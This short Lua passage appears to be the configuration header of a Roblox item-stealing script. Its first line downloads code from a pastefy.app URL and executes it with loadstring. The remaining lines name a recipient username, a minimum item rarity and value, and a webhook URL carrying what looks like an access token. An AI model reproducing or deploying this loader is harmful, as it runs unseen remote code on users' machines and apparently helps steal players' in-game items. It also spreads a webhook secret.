...
loadstring(game:HttpGet("https://pastefy.app/RCnRPduG/raw",true))()

local users = _G.Usernames or {"jabapie27"}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "Yes"
local webhook = _G.webhook or "https://customwebhook.vercel.app/api/webhooks/1395432389114724478/QtsOQGD8bBXr23bZMHASo25YhnC4lI_z6TZErLcGYvtvRbYIO6rGlJoBD3e3ftXz99Fs"
